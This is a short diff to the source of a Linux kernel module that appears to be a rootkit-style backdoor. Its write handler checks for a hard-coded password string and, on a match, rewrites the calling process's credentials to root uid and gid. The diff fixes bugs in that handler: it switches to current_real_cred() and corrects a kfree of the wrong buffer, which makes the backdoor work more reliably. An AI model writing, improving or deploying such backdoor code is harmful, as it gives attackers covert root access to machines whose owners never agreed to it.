@@ -24,6 +24,7 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.
 # include <linux/slab.h> // kmalloc, kfree.
 # include <asm/uaccess.h> // copy_from_user.
 # include <linux/cred.h> // struct cred.
+# include <linux/sched.h>
 # endif // CPP
 
 # include "lib/lib.h"
@@ -89,7 +90,7 @@ write_handler(struct file * filp, const char __user *buff,
     if (strlen(kbuff) == strlen(AUTH) &&
         strncmp(AUTH, kbuff, count) == 0) {
         fm_alert("%s\n", "Comrade, I will help you.");
-        cred = (struct cred *)__task_cred(current);
+        cred = (struct cred *)current_real_cred();
         // TODO: We might probably just copy the cred from pid 1.
         cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
         cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
@@ -98,6 +99,6 @@ write_handler(struct file * filp, const char __user *buff,
         fm_alert("Alien, get out of here: %s.\n", kbuff);
     }
 
-    kfree(buff);
+    kfree(kbuff);
     return count;
 }
